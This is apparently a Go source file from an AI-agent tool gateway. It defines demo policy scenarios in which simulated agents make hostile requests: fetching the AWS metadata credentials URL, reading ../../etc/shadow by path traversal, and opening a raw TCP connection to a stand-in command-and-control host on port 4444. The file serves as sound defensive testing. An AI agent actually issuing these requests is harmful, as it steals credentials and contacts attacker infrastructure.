package policy

import (
	"time"

	"github.com/Noooblien/mcpgate/pkg/rbac"
)

// DemoScenario wraps a simulated request with description and expectations.
type DemoScenario struct {
	Name        string
	Description string
	Request     PolicyRequest
}

// GenerateDemoScenarios returns 5 representative policy evaluation test scenarios.
func GenerateDemoScenarios() []DemoScenario {
	now := time.Now()

	return []DemoScenario{
		{
			Name:        "Safe Read Request (Standard Agent)",
			Description: "Standard agent invoking read_file on project documentation",
			Request: PolicyRequest{
				AgentID:  "agent-doc-indexer",
				Role:     rbac.RoleStandard,
				ToolName: "read_file",
				Args: map[string]interface{}{
					"path": "docs/architecture.md",
				},
				Timestamp: now,
			},
		},
		{
			Name:        "SSRF Cloud Metadata Exfiltration Attempt",
			Description: "Agent attempting to fetch AWS EC2 metadata IP (169.254.169.254)",
			Request: PolicyRequest{
				AgentID:  "agent-web-crawler",
				Role:     rbac.RoleStandard,
				ToolName: "fetch_url",
				Args: map[string]interface{}{
					"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
				},
				Timestamp: now,
			},
		},
		{
			Name:        "Path Traversal & Shadow File Leak",
			Description: "Agent attempting path traversal to /etc/shadow",
			Request: PolicyRequest{
				AgentID:  "agent-code-refactor",
				Role:     rbac.RoleRestricted,
				ToolName: "read_file",
				Args: map[string]interface{}{
					"path": "../../etc/shadow",
				},
				Timestamp: now,
			},
		},
		{
			Name:        "Privileged Command Exec (Approval Gated)",
			Description: "Admin agent attempting to execute terminal shell command",
			Request: PolicyRequest{
				AgentID:  "agent-ci-deployer",
				Role:     rbac.RoleAdmin,
				ToolName: "execute_command",
				Args: map[string]interface{}{
					"command": "systemctl restart api-service",
				},
				Timestamp: now,
			},
		},
		{
			Name:        "Zero-Trust Default Deny (Unregistered Tool)",
			Description: "Restricted agent trying to invoke unapproved external tool",
			Request: PolicyRequest{
				AgentID:  "agent-untrusted-bot",
				Role:     rbac.RoleRestricted,
				ToolName: "raw_tcp_connect",
				Args: map[string]interface{}{
					"host": "evil-c2.xyz",
					"port": 4444,
				},
				Timestamp: now,
			},
		},
	}
}
